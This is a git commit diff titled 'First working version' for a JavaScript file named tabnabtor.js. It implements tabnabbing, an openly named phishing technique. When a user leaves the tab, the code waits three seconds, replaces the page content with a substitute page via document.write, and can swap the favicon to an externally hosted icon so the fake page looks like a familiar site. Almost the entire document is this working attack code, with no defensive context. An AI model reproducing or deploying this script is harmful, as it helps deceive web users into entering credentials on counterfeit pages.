b585cc43c4061642fcca6563397a66a5dd136a10
George <george@FUCKUP.(none)>
2014-09-12 21:34:35 +0100

    First working version

--- app/tabnabtor.js
+++ app/tabnabtor.js
@@ -5,13 +5,18 @@
 *
 */
 
-window.onblur =
-	function () {
-		clear_page_contents();
-		build_page(webpage1);
-	}
+window.onblur = start_phishing_timeout;
 
+function start_phishing_timeout() {
+	setTimeout(start_phishing, 3000);
+}
 
+function start_phishing() {
+	//clear_page_contents();
+	build_page(webpage1);
+	//appendFavIcon('s');
+}
+	
 // Deletes all the current page elements to make space for the new ones
 function clear_page_contents() {
 	var all = document.getElementsByTagName("*");
@@ -26,9 +31,29 @@ function clear_page_contents() {
 }
 
 function build_page(webpage) {
+
+	/*var parser = new DOMParser(),
+	doc = parser.parseFromString(webpage.getSource, "text/xml");
+	console.log(webpage.getSource);
+	console.log(doc);*/
 	document.write(webpage.getSource);
+	document.close();
 }
 
+function appendFavIcon(webpage) {
+	document.head = document.head || document.getElementsByTagName('head')[0];
+	
+	var link = document.createElement('link'),
+	oldLink = document.getElementById('dynamic-favicon');
+	link.id = 'dynamic-favicon';
+	link.rel = 'shortcut icon';
+	link.href = 'http://astrocamel.com/marketing-narrow_files/favico.ico';
+	if (oldLink) {
+		document.head.removeChild(oldLink);
+	}
+	document.head.appendChild(link);
+ 
+}
 
 function build_page_head() {
 }
